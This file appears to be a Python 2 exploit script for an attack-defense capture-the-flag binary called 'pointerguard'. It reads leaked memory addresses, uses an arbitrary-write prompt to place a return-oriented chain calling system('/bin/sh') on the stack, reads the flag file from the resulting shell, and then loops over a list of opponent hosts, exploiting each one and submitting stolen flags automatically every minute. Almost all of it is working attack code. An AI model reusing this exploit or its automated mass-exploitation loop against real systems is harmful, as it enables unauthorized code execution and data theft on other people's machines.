__author__ = "pxx"

from zio import *

is_local = True
#is_local = False

binary_path = "./pointerguard"

libc_file_path = "./libc.x64.so"
#libc_file_path = "./libc.so.6"

ip = ""
port = 0

if is_local:
	target = binary_path
else:
	target = (ip, port)

def d2v_x64(data):
	return l64(data[:8].ljust(8, '\x00'))

def d2v_x32(data):
	return l32(data[:4].ljust(4, '\x00'))

def rd_wr_str(io, info, buff):
	io.read_until(info)
	io.write(buff)

def rd_wr_int(io, info, val):
	rd_wr_str(io, info, str(val) + "\n")

import struct
def u2i(val):

	data = struct.pack("<Q", val)
	return struct.unpack("<q", data)[0]


def get_io(target):
	r_m = COLORED(RAW, "green")
	w_m = COLORED(RAW, "blue")

	r_m = False
	w_m = False
	#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
	io = zio(target, timeout = 10, print_read = r_m, print_write = w_m, env={"LD_PRELOAD":libc_file_path})
	return io

binary_base = 0
libc_base = 0
stack_base = 0
p_rdi_ret = 0
system_addr = 0
binsh_addr = 0

def init_data(io):
	global binary_base
	global libc_base
	global stack_base
	global p_rdi_ret
	global system_addr
	global binsh_addr

	offset_system = 0x45390
	offset_binsh = 0x18cd17

	p_rdi_ret = 0x0000000000401333
	p_rsi_r15_ret = 0x0000000000401331

	io.read_until("_base=")
	data = io.read_until("\n")[:-1]
	binary_base = int(data, 16)
	io.read_until("_base=")
	data = io.read_until("\n")[:-1]
	libc_base = int(data, 16)
	io.read_until("_base=")
	data = io.read_until("\n")[:-1]
	stack_base = int(data, 16)

	system_addr = libc_base + offset_system
	binsh_addr = libc_base + offset_binsh

	#print u2i(0xffffffffffffffff)
	rd_wr_str(io, "somewhere?\n", "Yes! I want!\n")

def set_val(io, addr, val):
	rd_wr_int(io, "Addr:\n", u2i(addr))
	rd_wr_int(io, "Value:\n", u2i(val))

def set_val_list(io, data_list, full = True):

	if full == True:
		while len(data_list) < 10:
			data_list.append(data_list[-1])
	for item in data_list:
		#print hex(item[0]), hex(item[1])
		set_val(io, item[0], item[1])

def do_things(io, data, extern_data = ""):
	rd_wr_str(io, "before end\n", data)
	if "printf" in data or "malloc/free" in data:
		io.write(extern_data)

def pwn_main_stack(io):

	global p_rdi_ret
	global system_addr
	global binsh_addr

	global stack_base
	rsp_addr                 = 0x7ffefa07e208 + stack_base - 0x7ffefa07e134
	#print "offset:", hex(rsp_addr - stack_base)
	
	data_list = []
	data_list.append([rsp_addr, p_rdi_ret])
	data_list.append([rsp_addr+8, binsh_addr])
	data_list.append([rsp_addr+0x10, system_addr])

	set_val_list(io, data_list)
	do_things(io, "return\n")

def pwn_setval_stack(io):

	global p_rdi_ret
	global system_addr
	global binsh_addr

	global stack_base
	rsp_addr                 = 0x7ffd38456ac8 + stack_base - 0x7ffd38456ab4
	#print "offset:", hex(rsp_addr - stack_base)
	gadget_addr = 0x00000000004012bc #: add rsp, 0xa8 ; pop rbx ; pop rbp ; ret
	data_list = []
	data_list.append([rsp_addr+0xC0, p_rdi_ret])
	data_list.append([rsp_addr+0xC0+8, binsh_addr])
	data_list.append([rsp_addr+0xC0+0x10, system_addr])
	data_list.append([rsp_addr, gadget_addr])

	#print hex(stack_base)
	#io.gdb_hint()
	set_val_list(io, data_list, False)
	#do_things(io, "return\n")

def get_shell(io):
	io.writeline("cat flag/flag")
	data = io.read_until("\n")[:-1]
	print "-"*0x30
	print data.strip()
	print "-"*0x30
	return data.strip()

def pwn(io, way = 1):

	#offset info
	if is_local:
		#local
		offset_system = 0x0
		offset_binsh = 0x0
	else:
		#remote	
		offset_system = 0x0
		offset_binsh = 0x0

	init_data(io)
	if way == 0:
		pwn_main_stack(io)
	elif way == 1:
		pwn_setval_stack(io)

	return get_shell(io)


from libad import *
import time
while True:
	success_list = []
	for target in problem1_targets:
		print target
		for i in range(2):
			try:
				io = get_io(target)
				flag = pwn(io, i)
				if flag != "":
					submit_flag(flag)
					success_list.append(target[0])
					break
			except Exception as e:
				pass
	print len(success_list)
	for ip in success_list:
		print ip
	time.sleep(60)